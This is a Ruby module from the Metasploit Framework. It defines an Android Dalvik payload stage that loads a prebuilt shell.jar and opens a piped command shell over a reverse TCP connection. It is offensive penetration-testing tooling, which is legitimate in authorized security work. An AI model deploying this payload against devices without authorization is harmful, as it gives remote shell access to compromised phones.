##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/payload/android'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'


module MetasploitModule

  # The stager should have already included this
  #include Msf::Payload::Java
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'			=> 'Command Shell',
      'Description'	=> 'Spawn a piped command shell (sh)',
      'Author'		=> [
          'mihi', # all the hard work
          'egypt' # msf integration
        ],
      'Platform'		=> 'android',
      'Arch'			=> ARCH_DALVIK,
      'License'		=> MSF_LICENSE,
      'Session'		=> Msf::Sessions::CommandShell))
  end

  #
  # Override the {Payload::Android} version so we can load a prebuilt jar
  # to be used as the final stage
  #
  def generate_stage(opts={})
    clazz = 'androidpayload.stage.Shell'
    shell_jar = MetasploitPayloads.read("android", "shell.jar")

    # Name of the class to load from the stage, and then the actual jar
    # to load it from
    java_string(clazz) + java_string(shell_jar)
  end
end
